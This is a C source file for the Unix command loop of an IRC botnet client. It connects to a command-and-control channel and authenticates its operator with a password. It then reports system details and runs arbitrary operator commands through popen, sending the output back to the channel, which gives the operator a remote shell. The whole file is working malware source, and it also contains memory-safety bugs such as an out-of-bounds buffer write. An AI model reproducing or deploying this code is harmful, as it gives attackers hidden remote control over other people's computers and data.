/*	et_main_loop_nix.c
	Author: William Woodruff
	------------------------
	The primary function used by et to send/receive data on *nix.
*/

#include "../cnc_info.h"
#include <string.h>
#include <stdio.h>
#include <sys/utsname.h>
#include <stdbool.h>

/*	et_main_loop_nix
	The main loop called by et_nix.c to communicate with the IRC C&C server.
	arg: int socket, the network socket to write to/read from.
	arg: char *nick, the string containing the IRC nickname
*/
void et_main_loop_nix(int socket, char *nick)
{
	char buf[1024];
	bool auth = false;

	while(1)
	{
		memset(buf, 0, 1024);
		recv(socket, buf, 1023, 0);
		buf[1024] = '\0';

		char *ping;
		if ((ping = strstr(buf, "PING")) && !(strstr(buf, "CASEMAPPING")))
		{
			char *pong = strtok(ping, "\r\n");
			strncpy(pong, "PONG", 4);
			send(socket, pong, strlen(pong), 0);
		}
		else if (strstr(buf, "PRIVMSG") && strstr(buf, nick))
		{
			char *line = strtok(buf, "\r\n");
			char *cmd = strrchr(line, ':');
			cmd++; /* increment past the : */

			if (strstr(cmd, "auth") && !(strstr(cmd, "deauth")))
			{
				cmd += 5; /* increment past 'auth' */
				char auth_message[IRC_MSGLEN];

				if (!strcmp(cmd, IRC_AUTH))
				{
					auth = true;
					snprintf(auth_message, IRC_MSGLEN, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
					send(socket, auth_message, strlen(auth_message), 0);
				}
				else
				{
					snprintf(auth_message, IRC_MSGLEN, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
					send(socket, auth_message, strlen(auth_message), 0);
				}
			}
			else
			{
				if (!auth)
				{
					char unauth_message[IRC_MSGLEN];
					snprintf(unauth_message, IRC_MSGLEN, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
					send(socket, unauth_message, strlen(unauth_message), 0);
				}
				else
				{
					if (!strcmp(cmd, "kill"))
					{
						break; /* back to main@et_nix.c */
					}
					else if (!strcmp(cmd, "deauth"))
					{
						char deauth_message[IRC_MSGLEN];
						snprintf(deauth_message, IRC_MSGLEN, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
						send(socket, deauth_message, strlen(deauth_message), 0);
						auth = false;
					}
					else if (!strcmp(cmd, "info"))
					{
						struct utsname sys_info;
						uname(&sys_info);

						char info[IRC_MSGLEN];

						snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Kernel: %s\r\n", IRC_CHANNEL, sys_info.sysname);
						send(socket, info, strlen(info), 0);
						memset(info, 0, IRC_MSGLEN);

						snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Host: %s\r\n", IRC_CHANNEL, sys_info.nodename);
						send(socket, info, strlen(info), 0);
						memset(info, 0, IRC_MSGLEN);

						snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Release: %s\r\n", IRC_CHANNEL, sys_info.release);
						send(socket, info, strlen(info), 0);
						memset(info, 0, IRC_MSGLEN);

						snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Version: %s\r\n", IRC_CHANNEL, sys_info.version);
						send(socket, info, strlen(info), 0);
						memset(info, 0, IRC_MSGLEN);

						snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Arch: %s\r\n", IRC_CHANNEL, sys_info.machine);
						send(socket, info, strlen(info), 0);
						memset(info, 0, IRC_MSGLEN);
					}
					else if (strstr(cmd, "popup"))
					{
						char nopopup[IRC_MSGLEN];
						snprintf(nopopup, IRC_MSGLEN, "PRIVMSG %s :%s is nix and cannot create popups.\r\n", IRC_CHANNEL, nick);
						send(socket, nopopup, strlen(nopopup), 0);
					}
					else if (!strcmp(cmd, "persist"))
					{
						char nopersist[IRC_MSGLEN];
						snprintf(nopersist, IRC_MSGLEN, "PRIVMSG %s :%s is nix and cannot persist.\r\n", IRC_CHANNEL, nick);
						send(socket, nopersist, strlen(nopersist), 0);
					}
					else if (!strcmp(cmd, "depersist"))
					{
						char nodepersist[IRC_MSGLEN];
						snprintf(nodepersist, IRC_MSGLEN, "PRIVMSG %s :%s is nix and cannot depersist.\r\n", IRC_CHANNEL, nick);
						send(socket, nodepersist, strlen(nodepersist), 0);
					}
					else
					{
						char cmd_output[IRC_MSGLEN];
						char cmd_message[IRC_MSGLEN];

						FILE *output_file = popen(cmd, "r");
						fread((void *) cmd_output, 1, IRC_MSGLEN, output_file);

						int i;
						for (i = 0; cmd_output[i]; i++)
						{
							if (cmd_output[i] == '\n')
							{
								cmd_output[i] = ' ';
							}
						}

						if (strlen(cmd_output) >= 500)
						{
							snprintf(cmd_message, IRC_MSGLEN, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
						}
						else
						{
							snprintf(cmd_message, IRC_MSGLEN, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
						}

						send(socket, cmd_message, strlen(cmd_message), 0);
						pclose(output_file);
						memset(cmd_output, 0, IRC_MSGLEN);
					}
				}
			}
		}
	}
}
